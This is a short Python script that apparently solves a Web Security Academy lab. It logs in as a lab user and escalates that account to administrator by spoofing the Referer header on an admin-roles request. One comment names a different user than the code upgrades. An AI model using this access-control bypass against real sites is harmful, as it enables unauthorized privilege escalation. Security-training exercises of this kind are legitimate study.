import requests

site = '0af90004038ef40781aafe86000c00b8.web-security-academy.net'
s = requests.Session()

# Step 1: Log in as wiener
login_url = f'https://{site}/login'
s.post(login_url, data={'username': 'wiener', 'password': 'peter'})

# Step 2: Craft GET request to upgrade carlos, spoofing Referer
admin_upgrade_url = f'https://{site}/admin-roles?username=wiener&action=upgrade'
referer_url = f'https://{site}/admin'

resp = s.get(admin_upgrade_url, headers={'Referer': referer_url})

print(resp.status_code)
print("Looks like it worked!" if "Success" in resp.text or resp.status_code == 200 else "Might have failed.")

# Optional: Verify by checking /admin
check = s.get(f'https://{site}/admin')
print("Accessed /admin" if "Admin panel" in check.text else "Still locked out.")
